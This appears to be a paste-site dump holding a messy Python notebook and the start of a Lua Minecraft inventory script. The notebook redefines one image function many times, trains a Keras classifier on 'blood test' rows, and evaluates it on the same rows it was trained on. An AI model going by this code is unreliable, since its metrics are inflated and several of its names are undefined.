            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Create a gradient based on the normalized values
        gradient_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
        image[i, -1] = np.array([gradient_value] * 3)

    return image

def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use red for class 0 and green for class 1
        if predictions[i] == 0:
            image[i, -1] = np.array([255, 0, 0])  # Red
        elif predictions[i] == 1:
            image[i, -1] = np.array([0, 128, 0])  # Green

    return image

def create_image(data, predictions, label_colors):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [np.min(data), np.max(data)], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data[:, j]), np.max(data[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image


def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    data_array = np.array(data)  # Convert data to a NumPy array

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    data_array = np.array(data)  # Convert data to a NumPy array

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    # Now, normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(image[:, -1])
    max_pixel_value = np.max(image[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(image[i, -1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Now, normalize the last column separately to achieve grayscale


        min_pixel_value = np.min(data[:, -1])
        max_pixel_value = np.max(data[:, -1])
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        min_pixel_value = np.min(data[i])
        max_pixel_value = np.max(data[i])
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image


def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(data[:, -1])
    max_pixel_value = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    # Convert data to a NumPy array
    data = np.array(data)

    num_rows, num_columns = data.shape
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(data[:, -1])
    max_pixel_value = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image


def create_imageN(data, predictions, label_colors=None):
    # Convert data to a NumPy array
    data = np.array(data)

    num_rows, num_columns = data.shape
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value_last = np.min(data[:, -1])
    max_pixel_value_last = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value_last, max_pixel_value_last], [0, 255]))
        image[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


    print(""**************************"",num_training_rows,""*******************"")

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    # for i, label in enumerate(y_train):
    #     for j in range(len(X_train[0])
    #         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
    #         image_training[i, j] = np.array([pixel_value] * 3)
    #         image_training[i, -1] = np.array([128, 128, 128])
    #     if label == 0:
    #         image_training[i, -1] = np.array([0, 128, 0])
    #     elif label == 1:
    #         image_training[i, -1] = np.array([255, 0, 0])



    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    for i, label in enumerate(y_train):
        for j in range(len(X_train[0])):
            pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)
        image_training[i, -1] = np.array([128, 128, 128])
        if label == 0:
            image_training[i, -1] = np.array([0, 128, 0])
        elif label == 1:
            image_training[i, -1] = np.array([255, 0, 0])


    return image_training








def create_imageN(data, predictions, label_colors=None):
    num_training_rows = 1  # Set the number of rows to 1
    image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(data[0][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[0, j] = np.array([pixel_value] * 3)

    image_training[0, -1] = np.array([128, 128, 128])  # Set a consistent gray background

    label = y_train[0]
    if label == 0:
        image_training[0, -1] = np.array([0, 128, 0])  # Green for label 0
    elif label == 1:
        image_training[0, -1] = np.array([255, 0, 0])  # Red for label 1

    return image_training

def create_imageN(data, predictions, label_colors=None):
    num_training_rows = len(data)  # Set the number of rows based on the data
    num_columns = len(data[0])

    image_training = np.zeros((num_training_rows, num_columns + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    for i in range(num_training_rows):
        # Normalize the first columns independently
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image_training[i, -1] = label_colors[predictions[i]]

    return image_training




# Load data from a file
#file_path = 'C:/Users/Hynek/Desktop/example4.txt'
from google.colab import files
uploaded = files.upload()

# Tento kód otevře dialogové okno pro výběr souboru z vašeho počítače.
import io
import pandas as pd

# Předpokládáme, že jste nahráli CSV soubor
for fn in uploaded.keys():
  print('User uploaded file ""{name}"" with length {length} bytes'.format(
      name=fn, length=len(uploaded[fn])))
  path = io.BytesIO(uploaded[fn])  # Pro soubory, které potřebují být čteny jako binární objekty
  df = pd.read_csv(path)
  print(df.head())  # Vypíše prvních pět řádků DataFrame


all_results = []
#with open(file_path, 'r') as file:
#    file_content = file.read()

# Execute the content as Python code
##exec(file_content)

import os
import shutil
import ast

for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""/content/DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl přesunut do {destination_path}"")

file_path = '/content/DATA2'  # Cesta k souboru
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)


# Převod na NumPy pole
A = np.array(A_list)

#exec(code)

# Now, all_results contains lists corresponding to each row in the CSV file
##print(all_results)

# Assign values to variables dynamically based on the rows of matrix A
for i, row in enumerate(A, start=1):
    globals()[f""person{i}_results""] = list(row)

# Print the assigned variables
for i in range(1, len(A) + 1):
  #  print(f""person{i}_results {globals()[f'person{i}_results']}"")
    all_results.append(f""person{i}_results"")
##print(all_results)



result_variables = []

# Loop through the variable names and get the corresponding variables using globals()
for var_name in all_results:
    result_variables.append(globals()[var_name])

# Now, result_variables contains the variables with names specified in variable_names
#print(result_variables)

all_results = result_variables
new_persons_results = result_variables


# # Define the blood test results for sixteen persons
# person1_results = [80, 90, 100, 125, 120, 0]
# person2_results = [95, 105, 115, 110, 135, 1]
# person3_results = [110, 120, 130, 140, 150, 0]
# person4_results = [100, 110, 120, 130, 140, 1]
# person5_results = [105, 115, 100, 105, 110, 0]
# person6_results = [90, 110, 115, 95, 120, 1]
# person7_results = [116, 99, 106, 105, 119, 0]
# person8_results = [111, 93, 118, 118, 107, 1]
# person9_results = [107, 97, 105, 119, 98, 0]
# person10_results = [92, 108, 90, 117, 111, 1]
# person11_results = [118, 105, 103, 118, 99, 0]
# person12_results = [97, 115, 101, 101, 113, 1]
# person13_results = [95, 111, 93, 112, 120, 0]
# person14_results = [100, 112, 118, 109, 103, 1]
# person15_results = [113, 91, 94, 93, 99, 0]
# person16_results = [103, 92, 95, 110, 98, 1]

# # Combine the results into a list
# all_results = [person1_results, person2_results, person3_results, person4_results,
#                person5_results, person6_results, person7_results, person8_results,
#                person9_results, person10_results, person11_results, person12_results,
#                person13_results, person14_results, person15_results, person16_results]


# #all_results = [person1_results, person2_results]


# Extract the last column (0 or 1) as labels
labels = [results[-1] for results in all_results]

# Remove the last column from the dataset
data = [results[:-1] for results in all_results]

# Define the number of rows for training and testing
num_training_rows = 100
num_testing_rows = 100

# Split the data into training and testing datasets
#X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)

# Normalize the testing data using the min and max values of the training data
X_test_normalized = (X_test - min_values) / (max_values - min_values)


# Print normalized training data
print(""Normalized Training Data:"")
print(X_train_normalized)
print(""Adenormalized"",X_train_normalized*(max_values - min_values)+min_values,""Bdenormalized"")

# Define a simple neural network model
model = tf.keras.Sequential([
    tf.keras.layers.Dense(128, activation='relu', input_shape=(len(X_train[0]),)),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Lists to store accuracy values
accuracy_history = []

# Create images for the training data
image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


min_pixel_value = np.min(X_train_normalized)
max_pixel_value = np.max(X_train_normalized)

# Populate image_training with consistent gray and red/green colors based on the labels in the last column
# for i, label in enumerate(y_train):
#     for j in range(len(X_train[0])
#         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#         image_training[i, j] = np.array([pixel_value] * 3)
#         image_training[i, -1] = np.array([128, 128, 128])
#     if label == 0:
#         image_training[i, -1] = np.array([0, 128, 0])
#     elif label == 1:
#         image_training[i, -1] = np.array([255, 0, 0])



# Populate image_training with consistent gray and red/green colors based on the labels in the last column
for i, label in enumerate(y_train):
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, j] = np.array([pixel_value] * 3)
    image_training[i, -1] = np.array([128, 128, 128])
    if label == 0:
        image_training[i, -1] = np.array([0, 128, 0])
    elif label == 1:
        image_training[i, -1] = np.array([255, 0, 0])






from tqdm.notebook import tqdm_notebook


###ZDE VLOZTE DATA OD NOVYCH PACIENTU


# Train the model for 400 epochs
epochs = 138
# Assuming 'new_persons_results' is a list of new persons, where each person is represented as a list of features
new_persons_results = [
   # [101, 112],
   # [0.54422416, 0.02778176],
   # [22.57372914, 17.96922325],
#    [22.57372914, 17.96922325]
    # Add more new persons as needed
#          [23.65780072, 18.8599168 ],
#          [22.57372914, 17.96922325],
#          [32.55342397, 29.46365141],
#          [ 6.71803504, 25.70466547],
#          [ 6.71803504, 25.70466547],
#          [14.40191857, 16.77085649],
#          [17.45790731, 21.76521471],
#          [2110.02796947, 73.45445955],
#          [30.29513837, 62.90111289],
#          [15.1289778,  32.40267702],

 [23.65780072, 18.8599168 ],
 [22.57372914, 17.96922325],
 [32.55342397, 29.46365141],
 [ 6.71803504, 25.70466547],
 [14.40191857, 16.77085649],
 [17.45790731, 21.76521471],
 [20.02796947, 73.45445955],

]

import sys

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=True)
    accuracy_history.append(history.history['accuracy'][0])

    if epoch == 1:
        # Normalize the testing data
        X_test_normalized = (X_test - min_values) / (max_values - min_values)
        y_pred_after_2nd_epoch = model.predict(X_test_normalized)
        y_pred_binary_after_2nd_epoch = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch]
        image_testing_before_2nd_epoch = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=1):
            # Ensure that personNEW_results has the same number of features as the model expects
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""

            personNEW_results_normalized = (np.array(personNEW_results) - min_values) / (max_values - min_values)

            personNEW_prediction = model.predict(np.array([personNEW_results_normalized]))
            personNEW_label = 1 if personNEW_prediction >= 0.5 else 0
            y_pred_after_50_epochs = model.predict(X_test_normalized)
            y_pred_binary_after_50_epochs = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs]
            image_testing_after_50_epochs = create_image(X_test_normalized, y_pred_binary_after_50_epochs, label_colors_testing)

            # Create an image for the new person
            image_personNEW = create_imageN([personNEW_results_normalized], [personNEW_label], label_colors)

            # Display the images
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW)
            plt.title(f""New Person {idx}\nLabel: {personNEW_label}, Prediction: {personNEW_prediction}"")
            plt.axis(""off"")
            plt.show()


# Display the images
plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch)
plt.title(""Testing Data (2nd Epoch)"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs)
plt.title(f""Testing Data ({epochs} Epochs)"")
plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW)
plt.title(f""New Person\nLabel: {personNEW_label},[{personNEW_prediction}]"")
plt.axis(""off"")

# Plot accuracy history
plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), accuracy_history, marker='o')
plt.title('Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

# Print normalized data
print(""Normalized PersonNEW Data:"")
print(personNEW_results_normalized)

plt.show()

print(""X_train before normalization:"")
print(X_train)
print(""X_test before normalization:"")
print(X_test)

import seaborn as sns


print(""KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"")
print(X_test)
print(""HHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"")
print(X_train)
print(""LLLLLLLLLLLLLLLLLLLLLLLLLLLLL"")


# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix
# conf_matrix = confusion_matrix(y_train, y_pred_binary)
# print(conf_matrix)


from sklearn.metrics import confusion_matrix
from tensorflow.keras.utils import to_categorical

# # Normalize the training data
# min_values = np.min(np.concatenate([X_train, X_test], axis=0), axis=0)
# max_values = np.max(np.concatenate([X_train, X_test], axis=0), axis=0)
# X_train_normalized = (X_train - min_values) / (max_values - min_values)
# X_test_normalized = (X_test - min_values) / (max_values - min_values)

np.set_printoptions(threshold=np.inf, precision=4, suppress=True)


# # Assuming X_test_normalized and y_test are your test set data
# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix using the test set
# conf_matrix = confusion_matrix(y_test, y_pred_binary)
# print(conf_matrix)



# plt.figure(figsize=(6, 6))
# sns.heatmap(conf_matrix, annot=True, fmt=""d"", cmap=""Blues"", xticklabels=['Predicted 0', 'Predicted 1'], yticklabels=['Actual 0', 'Actual 1'])
# plt.xlabel(""Predicted Label"")
# plt.ylabel(""True Label"")
# plt.title(""Confusion Matrix"")
# plt.show()

# X_train = np.array(X_train)
# y_train_one_hot = np.array(y_train_one_hot)

# RozdÄ›lenĂ­ dat na trĂ©novacĂ­ a testovacĂ­ mnoĹľiny
###X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

###X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_training_rows], labels[:num_training_rows], labels[:num_training_rows]
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

import numpy as np
import matplotlib.pyplot as plt
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import tensorflow as tf
import seaborn as sns

# Assuming data splitting and model definition have been done correctly

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Train the model
print(""Training Start"")
for epoch in tqdm_notebook(range(1000), desc=""Training Progress""):
    model.fit(np.array(X_train_normalized), np.array(y_train), epochs=1, verbose=0)
print(""Training Complete"")

# Generate predictions from the model
predictions = (model.predict(X_test_normalized) > 0.5).astype(int)

# Convert y_test to a numpy array and then to binary labels
y_test_array = np.array(y_test)  # Convert y_test to a numpy array
y_test_binary = (y_test_array > 0.5).astype(int)  # Convert to binary

# Compute the confusion matrix
conf_matrix = confusion_matrix(y_test_binary, predictions)

# Evaluate the model's performance
accuracy = accuracy_score(y_test_binary, predictions)
precision = precision_score(y_test_binary, predictions)
recall = recall_score(y_test_binary, predictions)
f1 = f1_score(y_test_binary, predictions)

# Display the confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()

print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""Recall: {recall:.4f}"")
print(f""F1 Score: {f1:.4f}"")

print(f""Confusion Matrix2122:\n{conf_matrix}"")"
XuHGRVpg,InventoryPull,Zeehao,Lua,Saturday 25th of May 2024 03:22:36 PM CDT,"local component = require(""component"")
local event = require(""event"")
local math = require(""math"")
local sides = require(""sides"")

local CircleQueue = require(""circulateQueue"")
local Screen = require(""gui"").Screen
local Section = require(""gui"").Section
local ScrollBar = require(""gui"").ScrollBar
local COLORS = require(""gui"").COLORS
local TextArea = require(""gui"").TextArea
local List = require(""gui"").List
local Label = require(""gui"").Label
local Button = require(""gui"").Button

local loggers = require(""logger"")
local logger = loggers.getLogger(""InventoryPull"")

local transposer = component.transposer

-- local transposer = {
--     getInventorySize = function(side)
--         return 21
--     end,
--     getStackInSlot = function(side, slot)
--         return { name = ""minecraft:stone_"" .. slot % 10, label = ""Stone_"" .. slot % 10, size = 64 }
--     end,
--     transferItem = function(sideA, sideB, size, slotA, slotB)
--         return 1
--     end,
--     getAllStacks = function(side)
--         return function()
--             return nil
--         end
--     end
-- }

local inventorySide = sides.north
local pullside = sides.top
local fullOxygenTankChestSide = sides.south
local oxygenTankInfo = transposer.getStackInSlot(fullOxygenTankChestSide, 1)

local moveItem = function(sideA, slotA, sideB, size)
    local invSize = transposer.getInventorySize(sideB);
    for slotB = 1, invSize do
        local transAmt = transposer.transferItem(sideA, sideB, size, slotA, slotB)
        if size - transAmt == 0 then
            return true
        end
    end
    return false
end

local findFullOxygenTankSlot = function()
    local slotInfo = nil
    local count = 0
    local chestItem = transposer.getAllStacks(fullOxygenTankChestSide)
    repeat
        count = count + 1
        slotInfo = chestItem()
        if slotInfo ~= nil and slotInfo.name == oxygenTankInfo.name and slotInfo.damage == 0 then
            return count
        end
    until slotInfo == nil
end

local data = {}

data.pullItems = {
    items = {},
    sortedItems = {},
    displayItems = {},
    selectedLabel = nil,
    currentPage = 1,
    maxPage = 1,
    maxDisplayItems = 22,
    setMaxPage = function(self)
        self.maxPage = math.max(math.ceil(#self.sortedItems / self.maxDisplayItems), 1)
    end,
    add = function(self, item)
        self.sortedItems = {}
        if self.items[item.name] ~= nil then
            return
        end
        self.items[item.name] = item
        for _, value in pairs(self.items) do
            table.insert(self.sortedItems, value)
        end
        self:setMaxPage()
        table.sort(self.sortedItems, function(a, b) return a.label < b.label end)
        self:setDisplayItems()
    end,
    remove = function(self)
        self.sortedItems = {}
        if self.selectedLabel == nil then
            return
        end
        self.items[self.displayItems[self.selectedLabel.idx].name] = nil
        for _, value in pairs(self.items) do
            table.insert(self.sortedItems, value)
        end
        self:setMaxPage()
        table.sort(self.sortedItems, function(a, b) return a.label < b.label end)
        self:unselected()
        self:setDisplayItems()
    end,
    setDisplayItems = function(self)
        self.displayItems = {}
        if self.currentPage > self.maxPage then
            self.currentPage = self.maxPage
        end
        for i = (self.currentPage - 1) * self.maxDisplayItems + 1, self.currentPage * self.maxDisplayItems do
            if self.sortedItems[i] ~= nil then
                table.insert(self.displayItems, self.sortedItems[i])
            end
        end
        if self.selectedLabel ~= nil and self.selectedLabel ~= nil then
            self.selectedLabel:setBackgroundColor(COLORS.grey)
            self.selectedLabel = nil
        end
    end,
    setPage = function(self, page)
        if page == self.currentPage then
            return
        end
        self.currentPage = page
        self.displayItems = {}
        self:setDisplayItems();
    end,
    unselected = function(self)
        if self.selectedLabel ~= nil then
            self.selectedLabel:setBackgroundColor(COLORS.grey)
            self.selectedLabel = nil
        end
    end,
}

data.inventoryItems = {
    items = {},
    sortedItems = {},
    displayItems = {},
    selectedLabel = nil,
    currentPage = 1,
    maxPage = 1,
    maxDisplayItems = 22,
    removeItemForInventoryIfInPullList = function(self, item, slot)
        if item == nil then
            return nil
        end
        if data.pullItems.items[item.name] ~= nil then
            if moveItem(inventorySide, slot, pullside, 1) then
                logger:print(""move item: "" .. item.name .. "" to pull side"")
                return nil
            else
                return item
            end
        end
        return item
    end,
    replaceOxygenTank = function(self, item, slot)
        if item == nil then
            return nil
        end
        if item.name == oxygenTankInfo.name and item.damage ~= 0 then
            local chestSlot = findFullOxygenTankSlot()
            if chestSlot == nil then
                return nil
            end
            moveItem(inventorySide, slot, fullOxygenTankChestSide, 1)
            moveItem(fullOxygenTankChestSide, chestSlot, inventorySide, 1)
            logger:print(""move oxygen tank from player inventory: "" .. slot .. "" to refill-Chest: "" .. chestSlot)
            return item
        end
        return item
    end,
    refresh = function(self)
        self.items = {}
        self.sortedItems = {}
        for i = 1, transposer.getInventorySize(inventorySide) do
            local item = transposer.getStackInSlot(inventorySide, i)
            item = self:replaceOxygenTank(item, i)
            if item ~= nil and self.items[item.name] == nil then
                self.items[item.name] = item
                table.insert(self.sortedItems, item)
            end
        end
        table.sort(self.sortedItems, function(a, b) return a.label < b.label end)
        self.maxPage = math.ceil(#self.sortedItems / self.maxDisplayItems)
        self:setDisplayItems()
    end,
    unselected = function(self)
        if self.selectedLabel ~= nil then
            self.selectedLabel:setBackgroundColor(COLORS.grey)
            self.selectedLabel = nil
        end
    end,
    setDisplayItems = function(self)
        self.displayItems = {}
        if self.currentPage > self.maxPage then
            self.currentPage = self.maxPage
        end
        for i = (self.currentPage - 1) * self.maxDisplayItems + 1, self.currentPage * self.maxDisplayItems do
            if self.sortedItems[i] ~= nil then
                table.insert(self.displayItems, self.sortedItems[i])
            end
        end
        if self.selectedLabel ~= nil and self.selectedLabel.text == """" then
            self.selectedLabel:setBackgroundColor(COLORS.grey)
        end
    end,
    setPage = function(self, page)
        if page == self.currentPage then
            return
        end
        self.currentPage = page
        self:setDisplayItems();
    end,
}

data.log = {
    data = CircleQueue:new(44 * 7),
    display = {},
    currPos = 1,
    maxPos = 1,
    textArea = nil,
    logScrollBar = nil,
    add = function(self, ...)
        -- concat all the arguments into a single string, make sure boolean, number and nil are converted to strings
        local raw = table.concat({ ... }, ""\t"")
        local lines = self.logTextArea:wrapText(raw)
        for i = 1, #lines do
